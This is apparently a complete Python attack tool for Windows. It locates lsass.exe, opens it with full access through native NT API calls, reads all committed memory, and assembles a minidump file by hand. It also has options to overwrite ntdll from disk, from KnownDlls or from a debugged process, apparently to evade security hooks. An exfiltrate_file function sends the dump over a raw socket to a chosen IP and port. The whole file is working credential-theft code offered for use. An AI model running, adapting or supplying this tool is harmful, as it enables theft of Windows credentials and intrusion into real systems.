import os, sys
import json
import psutil
import random
import string
import ctypes
from ctypes import wintypes
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 
import argparse
from overwrite import overwrite_disk, overwrite_knowndlls, overwrite_debugproc
import socket


# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MemoryBasicInformation = 0
ProcessBasicInformation = 0 
PAGE_NOACCESS = 0x01
MEM_COMMIT = 0x00001000


# Structures
class OSVERSIONINFOEXW(ctypes.Structure):
    _fields_ = [
        ("dwOSVersionInfoSize", wintypes.DWORD),
        ("dwMajorVersion", wintypes.DWORD),
        ("dwMinorVersion", wintypes.DWORD),
        ("dwBuildNumber", wintypes.DWORD),
        ("dwPlatformId", wintypes.DWORD),
        ("szCSDVersion", wintypes.WCHAR * 128),
        ("wServicePackMajor", wintypes.WORD),
        ("wServicePackMinor", wintypes.WORD),
        ("wSuiteMask", wintypes.WORD),
        ("wProductType", wintypes.BYTE),
        ("wReserved", wintypes.BYTE),
    ]

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Reserved1", wintypes.LPVOID),
        ("PebBaseAddress", wintypes.LPVOID),
        ("Reserved2", wintypes.LPVOID * 2),
        ("UniqueProcessId", wintypes.HANDLE),
        ("Reserved3", wintypes.LPVOID)
    ]

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('BaseAddress', wintypes.LPVOID),
        ('AllocationBase', wintypes.LPVOID),
        ('AllocationProtect', wintypes.DWORD),
        ('RegionSize', ctypes.c_size_t),
        ('State', wintypes.DWORD),
        ('Protect', wintypes.DWORD),
        ('Type', wintypes.DWORD)
    ]

class CLIENT_ID(ctypes.Structure):
    _fields_ = [
        ("UniqueProcess", wintypes.HANDLE),
        ("UniqueThread", wintypes.HANDLE)
    ]

class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.ULONG),
        ("RootDirectory", wintypes.HANDLE),
        ("ObjectName", wintypes.LPVOID),
        ("Attributes", wintypes.ULONG),
        ("SecurityDescriptor", wintypes.LPVOID),
        ("SecurityQualityOfService", wintypes.LPVOID)
    ]

def initialize_object_attributes():
    return OBJECT_ATTRIBUTES(
        Length=ctypes.sizeof(OBJECT_ATTRIBUTES),
        RootDirectory=None,
        ObjectName=None,
        Attributes=0,
        SecurityDescriptor=None,
        SecurityQualityOfService=None
    )


# NTAPI functions
ntdll = ctypes.WinDLL("ntdll")
NtQueryInformationProcess = ntdll.NtQueryInformationProcess
NtQueryInformationProcess.restype = wintypes.LONG
NtQueryInformationProcess.argtypes = [wintypes.HANDLE, wintypes.ULONG, wintypes.HANDLE, wintypes.ULONG, wintypes.PULONG]
NtReadVirtualMemory = ntdll.NtReadVirtualMemory
NtReadVirtualMemory.restype = wintypes.LONG
NtReadVirtualMemory.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.LPVOID,    # BaseAddress
    wintypes.LPVOID,    # Buffer
    wintypes.ULONG,     # NumberOfBytesToRead
    wintypes.PULONG     # NumberOfBytesRead
]
NtQueryVirtualMemory = ntdll.NtQueryVirtualMemory
NtQueryVirtualMemory.restype = wintypes.DWORD
NtQueryVirtualMemory.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.LPVOID,    # BaseAddress
    wintypes.DWORD,     # MemoryInformationClass
    wintypes.LPVOID,    # MemoryInformation
    wintypes.ULONG,     # MemoryInformationLength
    wintypes.LPVOID     # ReturnLength (optional)
]
NtOpenProcess = ntdll.NtOpenProcess
NtOpenProcess.restype = wintypes.LONG
NtOpenProcess.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.DWORD,     # DesiredAccess
    wintypes.LPVOID,    # ObjectAttributes
    wintypes.LPVOID     # ClientId
]
RtlGetVersion = ntdll.RtlGetVersion
RtlGetVersion.restype = wintypes.LONG


def get_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choices(characters, k=length))
    return random_string


def get_pid(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            return proc.info['pid']


def open_process(pid):
    process_handle = wintypes.HANDLE()
    obj_attributes = initialize_object_attributes()
    client_id = CLIENT_ID(
        UniqueProcess=ctypes.c_void_p(pid),
        UniqueThread=None
    )

    status = NtOpenProcess(
        ctypes.byref(process_handle),
        PROCESS_ALL_ACCESS,
        ctypes.byref(obj_attributes),
        ctypes.byref(client_id)
    )

    if status != 0 or not process_handle:
        print("[-] Could not open handle to the process. Not running as administrator maybe?")
        sys.exit(0)

    return process_handle


def read_remoteintptr(process_handle, mem_address):
    buffer = ctypes.create_string_buffer(8)
    bytes_read = wintypes.ULONG(0)
    status = NtReadVirtualMemory(
            process_handle,
            mem_address,
            buffer,
            8,
            ctypes.byref(bytes_read)
        )

    if status != 0:
        return

    read_bytes = buffer.raw[:bytes_read.value][::-1]
    read_int = int(str((read_bytes).hex()),16)
    return read_int 


def read_remoteWStr(process_handle, mem_address):
    buffer = ctypes.create_string_buffer(256)
    bytes_read = wintypes.ULONG(0)
    status = NtReadVirtualMemory(
            process_handle,
            mem_address,
            buffer,
            256,
            ctypes.byref(bytes_read)
        )

    if status != 0:
        return ""

    read_bytes = buffer.raw[:bytes_read.value]
    index = read_bytes.find(b'\x00\x00')
    unicode_str = (read_bytes[:index].decode('unicode-escape'))
    unicode_str_clean = "".join(char for char in unicode_str if char.isprintable())
    return unicode_str_clean 


def update_json_array(data, name_to_update, field_to_update, new_value):
    for obj in data:
        if obj.get('BaseName') == name_to_update:
            obj[field_to_update] = new_value
            break
    return data


def get_modules_info(process_handle):
    process_information = PROCESS_BASIC_INFORMATION()
    return_length = wintypes.ULONG()
    status = NtQueryInformationProcess(
        process_handle,
        ProcessBasicInformation,
        ctypes.byref(process_information),
        ctypes.sizeof(process_information),
        ctypes.byref(return_length)
    )

    if status != 0:
        raise ctypes.WinError(ctypes.get_last_error())
    
    print("[+] PEB Base Address: \t" + str(hex(process_information.PebBaseAddress)))

    ldr_offset = 0x18
    ldr_pointer = process_information.PebBaseAddress + ldr_offset
    ldr_address = read_remoteintptr(process_handle, ldr_pointer)
    
    inInitializationOrderModuleList_offset = 0x30
    InInitializationOrderModuleList = ldr_address + inInitializationOrderModuleList_offset

    next_flink = read_remoteintptr(process_handle, InInitializationOrderModuleList)

    dll_base = 1337
    flink_dllbase_offset = 0x20
    flink_buffer_fulldllname_offset = 0x40
    flink_buffer_offset = 0x50

    moduleinfo_arr = []

    while (dll_base != 0):
        next_flink = next_flink - 0x10
        
        dll_base = read_remoteintptr(process_handle, (next_flink + flink_dllbase_offset))
        if dll_base == 0:
            break
        
        buffer = read_remoteintptr(process_handle, (next_flink + flink_buffer_offset))
        base_dll_name = read_remoteWStr(process_handle, buffer)

        buffer = read_remoteintptr(process_handle, (next_flink + flink_buffer_fulldllname_offset))
        full_dll_path = read_remoteWStr(process_handle, buffer)
        
        module_info = { 
            "BaseName" : base_dll_name, 
            "FullDllName" : full_dll_path,
            "BaseAddress" : hex(dll_base),
            "RegionSize" : 0
        }
        moduleinfo_arr.append(module_info)
        next_flink = read_remoteintptr(process_handle, (next_flink + 0x10))

    return moduleinfo_arr


def create_file(dump_file, output_file):
    with open(output_file, "wb") as binary_file:
        binary_file.write(dump_file)


def exfiltrate_file(dump_file, ip_address, port_address):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address,int(port_address)))
    s.sendall(dump_file)
    s.close()


def read_binary_file(file_path):
    with open(file_path, 'rb') as file:
        byte_array = file.read()
    return byte_array


def get_dump_bytearr(os_version, moduleinfo_arr, mem64list_arr, regions_memdump):
    # Calculations
    number_modules = str(len(moduleinfo_arr))
    modulelist_size = 4
    modulelist_size += 108*int(number_modules)
    for module in moduleinfo_arr:
        module_fullpath_len = len(module.get("FullDllName"))
        modulelist_size += (module_fullpath_len*2 + 8)

    mem64list_offset = modulelist_size + 0x7c
    mem64list_size = 16 + 16*len(mem64list_arr)
    offset_memory_regions = mem64list_offset + mem64list_size

    print("[+] Total number of modules: \t" + number_modules)
    print("[+] ModuleListStream size:   \t" + str(modulelist_size))
    print("[+] Mem64List offset: \t\t" + str(mem64list_offset))
    print("[+] Mem64List size: \t\t" + str(mem64list_size))

    # Header
    header  = b'\x4d\x44\x4d\x50' # Signature
    header += b'\x93\xa7' # Version
    header += b'\x00\x00' # ImplementationVersion
    header += b'\x03\x00\x00\x00' # NumberOfStreams
    header += b'\x20\x00\x00\x00' # StreamDirectoryRva
    header += b'\x00'*(32 - len(header)) # Other fields

    # Stream Directory
    stream_directory =  b'\x04\x00\x00\x00' # Type 4 = ModuleListStream
    stream_directory += modulelist_size.to_bytes(4, 'little') # Size
    stream_directory += b'\x7c\x00\x00\x00' # Address

    stream_directory += b'\x07\x00\x00\x00' # Type 7 = SystemInfoStream
    stream_directory += b'\x38\x00\x00\x00' # Size = 56 (constant)
    stream_directory += b'\x44\x00\x00\x00' # Address = 0x44 (constant)

    stream_directory += b'\x09\x00\x00\x00' # Type 9 = Memory64ListStream
    stream_directory += mem64list_size.to_bytes(4, 'little') # # Size
    stream_directory += mem64list_offset.to_bytes(4, 'little') # Address

    # SystemInfoStream
    processor_architecture = 9
    majorversion = int(os_version.get("MajorVersion"))
    minorversion = int(os_version.get("MinorVersion"))
    build_number = int(os_version.get("BuildNumber"))
    systeminfo_stream = processor_architecture.to_bytes(2, 'little') # Processor architecture
    systeminfo_stream += b'\x00'*6
    systeminfo_stream += majorversion.to_bytes(4, 'little') # Major version
    systeminfo_stream += minorversion.to_bytes(4, 'little') # Minor version
    systeminfo_stream += build_number.to_bytes(4, 'little') # Build number
    systeminfo_stream += b'\x00'*(56-len(systeminfo_stream))

    # ModuleListStream
    modulelist_stream = int(number_modules).to_bytes(4, 'little') # NumberOfModules
    pointer_index = 0x7c
    pointer_index += len(modulelist_stream) # 4 
    pointer_index += 108*int(number_modules)

    for module in moduleinfo_arr:
        modulelist_stream += int(module.get("BaseAddress"),16).to_bytes(8, 'little') # Module Address
        modulelist_stream += int(module.get("RegionSize")).to_bytes(8, 'little') # Module Size
        modulelist_stream += b'\x00'*4
        modulelist_stream += pointer_index.to_bytes(8, 'little') # Pointer to unicode string
        full_path = module.get("FullDllName")
        pointer_index += len(full_path)*2 + 8
        modulelist_stream += b'\x00'*(108-(8+8+4+8))

    for module in moduleinfo_arr:
        full_path = module.get("FullDllName")
        unicode_bytearr = bytearray(full_path.encode('utf-16-le'))
        modulelist_stream += (len(full_path)*2).to_bytes(4, 'little') # Unicode length
        modulelist_stream += unicode_bytearr # Unicode string
        modulelist_stream += 4*b'\x00' # Empty character + padding

    # Memory64List
    memory64list_stream = len(mem64list_arr).to_bytes(8, 'little') # NumberOfEntries
    memory64list_stream += offset_memory_regions.to_bytes(8, 'little') # MemoryRegionsBaseAddress
    for mem64 in mem64list_arr:
        memory64list_stream += int(mem64.get("BaseAddress"),16).to_bytes(8, 'little') # Mem64 Address
        memory64list_stream += int(mem64.get("RegionSize")).to_bytes(8, 'little')    # Mem64 Size

    dump_file = header + stream_directory + systeminfo_stream + modulelist_stream + memory64list_stream + regions_memdump
    return dump_file


def get_os_version():
    os_version_info = OSVERSIONINFOEXW()
    os_version_info.dwOSVersionInfoSize = ctypes.sizeof(OSVERSIONINFOEXW)
    status = RtlGetVersion(ctypes.byref(os_version_info))
    lock_info = None
    if status == 0:
        lock_info = [{
          "MajorVersion": str(os_version_info.dwMajorVersion),
          "MinorVersion": str(os_version_info.dwMinorVersion),
          "BuildNumber": str(os_version_info.dwBuildNumber)
        }]
    else:
        print("[-] Failed to get version information")
    return lock_info
    

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-o', '--option', required=False, default="", action='store', help='Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"')
    parser.add_argument('-k', '--path'  , required=False, default="", action='store', help='Path to ntdll file in disk (for \"disk\" option) or program to open in debug mode (\"debugproc\" option)')
    parser.add_argument('-i', '--ip'    , required=False, default="", action='store', help='IP Address for exfiltration')
    parser.add_argument('-p', '--port'  , required=False, default="", action='store', help='Port for exfiltration')
    my_args = parser.parse_args()
    return my_args


def main():
    args = get_args()
    option = args.option
    if option == "disk":
        path = "C:\\Windows\\System32\\ntdll.dll"
        if args.path != "":
            path = args.path
        overwrite_disk(path)
    elif option == "knowndlls":
        overwrite_knowndlls()
    elif option == "debugproc":
        path = "c:\\windows\\system32\\calc.exe"
        if args.path != "":
            path = args.path
        overwrite_debugproc(path)
    else:
        pass

    pid_ = get_pid("lsass.exe")
    if pid_:
        print("[+] PID: \t\t" + str(pid_))
    else:
        print("[-] PID not found")
    process_handle = open_process(pid_)
    print("[+] Process handle: \t" + str(process_handle.value))

    # Get ModuleList information
    moduleinfo_arr = get_modules_info(process_handle)
    
    # Loop memory regions
    mem_address = 0
    proc_max_address_l = 0x7FFFFFFEFFFF
    aux_size = 0
    aux_name = ""
    mem64list_arr = []
    regions_memdump = b''

    while (mem_address < proc_max_address_l):
        memory_info = MEMORY_BASIC_INFORMATION()
        memory_info_size = ctypes.sizeof(memory_info)
        return_length = ctypes.c_size_t()

        status = NtQueryVirtualMemory(
            process_handle,
            mem_address,
            MemoryBasicInformation,
            ctypes.byref(memory_info),
            memory_info_size,
            ctypes.byref(return_length)
        )

        # Page is accessible and committed
        if memory_info.Protect != PAGE_NOACCESS and memory_info.State == MEM_COMMIT:
            # Update Module Size for ModuleList stream
            matching_object = next((obj for obj in moduleinfo_arr if obj.get('BaseName') == aux_name), {"BaseName" : "0", "FullDllName" : "0", "BaseAddress" : "0", "RegionSize" : "0"})
            if memory_info.RegionSize == 0x1000 and memory_info.BaseAddress != matching_object.get("BaseAddress"):
                update_json_array(moduleinfo_arr, aux_name, "RegionSize", aux_size)
                matching_object = next((obj for obj in moduleinfo_arr if obj.get('BaseName') == aux_name), {"BaseName" : "0", "FullDllName" : "0", "BaseAddress" : "0", "RegionSize" : "0"})
    
                for i in moduleinfo_arr:
                    if int(memory_info.BaseAddress) == int(i.get("BaseAddress"),16):
                        aux_name = i.get("BaseName")
                        aux_size = memory_info.RegionSize
            else:
                aux_size += memory_info.RegionSize

            # Dump memory region
            buffer = ctypes.create_string_buffer(memory_info.RegionSize)
            bytes_read = wintypes.ULONG(0)
            status = NtReadVirtualMemory(
                process_handle,
                memory_info.BaseAddress,
                buffer,
                memory_info.RegionSize,
                ctypes.byref(bytes_read)
            )

            if status == 0:
                regions_memdump += buffer.raw
                mem64list_arr.append({"BaseAddress": hex(mem_address), "RegionSize": memory_info.RegionSize})
        
        mem_address += memory_info.RegionSize

    os_version = get_os_version()[0]
    dump_file_bytes = get_dump_bytearr(os_version, moduleinfo_arr, mem64list_arr, regions_memdump)
    dump_file_name = "proc_" + str(pid_) + ".dmp"
    if args.ip == "" or args.port == "":
        create_file(dump_file_bytes, dump_file_name)
        print("[+] File " + dump_file_name + " created.")
    else:
        exfiltrate_file(dump_file_bytes, args.ip, args.port)
        print("[+] File exfiltrated.")


if __name__ == "__main__":
    main()